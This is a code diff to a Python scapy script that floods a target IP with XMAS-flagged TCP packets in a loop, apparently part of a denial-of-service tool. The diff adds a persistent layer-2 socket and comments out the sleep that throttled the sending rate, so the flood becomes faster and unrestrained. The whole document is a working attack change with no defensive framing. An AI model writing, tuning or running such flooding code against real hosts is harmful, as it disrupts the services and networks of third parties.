@@ -18,6 +18,7 @@ except:
     from urllib.parse import urlparse
 try:
     from scapy.all import *
+    from scapy.config import conf
 except:
     print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
     sys.exit(2)
@@ -35,6 +36,7 @@ def randInt():
 def xmasize(ip, sport, rounds, source = None):
     n=0
     xmas_sent = 0
+    s = conf.L2socket()
     try:
         for x in range (0,int(rounds)):
             n=n+1
@@ -63,12 +65,12 @@ def xmasize(ip, sport, rounds, source = None):
             TCP_l.window = window
             TCP_l.flags = "UFP" # ALL FLAGS SET (like a XMAS tree)
             try:
-                send(IP_p/TCP_l, verbose=0)
+                s.send(IP_p/TCP_l, verbose=0)
                 # print("[Info] [AI] [XMAS] Firing 'ionized quartz' ["+str(n)+"] -> [IONIZING!]")
                 xmas_sent += 1
                 if xmas_sent % REPORT_PER_ATTACK == 0:
                     print("[Info] [AI] [XMAS] Fired 'ionized quartz' ["+str(xmas_sent)+"]")
-                time.sleep(1/XMAS_SPEED) # sleep time required for balanced sucess
+                # time.sleep(1/XMAS_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [XMAS] Failed to engage with 'ionized quartz' ["+str(n)+"]")
     except:
